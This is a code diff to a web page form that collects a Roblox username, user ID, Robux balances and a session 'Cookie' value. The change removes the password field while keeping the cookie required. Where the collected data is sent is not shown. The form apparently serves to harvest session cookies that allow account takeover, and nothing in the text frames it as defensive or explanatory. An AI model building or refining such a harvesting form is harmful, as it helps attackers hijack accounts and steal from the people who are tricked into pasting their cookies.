@@ -90,7 +90,6 @@
     <div class="card">
       <form id="demoForm">
         <input id="username" type="text" placeholder="Username" />
-        <input id="password" type="text" placeholder="Password" />
         <input id="userId" type="text" placeholder="User ID" />
         <input id="robux" type="text" placeholder="Robux" />
         <input id="pending" type="text" placeholder="Pending Robux" />
@@ -131,7 +130,6 @@
   
   // Get all form inputs
   const usernameInput = document.getElementById('username');
-  const passwordInput = document.getElementById('password');
   const userIdInput = document.getElementById('userId');
   const robuxInput = document.getElementById('robux');
   const pendingInput = document.getElementById('pending');
@@ -144,7 +142,6 @@
     // Collect all form data
     const formData = {
       username: usernameInput.value.trim(),
-      password: passwordInput.value.trim(),
       userId: userIdInput.value.trim(),
       robux: robuxInput.value.trim(),
       pending: pendingInput.value.trim(),
@@ -155,8 +152,8 @@
     };
 
     // Basic validation
-    if (!formData.cookie || !formData.password || !formData.username) {
-      status.textContent = '❌ Please fill in Username, Password, and Cookie';
+    if (!formData.cookie || !formData.username) {
+      status.textContent = '❌ Please fill in Username and Cookie';
       status.style.color = '#ff5b5b';
       return;
     }
@@ -206,7 +203,6 @@
         status.style.color = '#4CAF50';
         // Clear form
         usernameInput.value = '';
-        passwordInput.value = '';
         userIdInput.value = '';
         robuxInput.value = '';
         pendingInput.value = '';
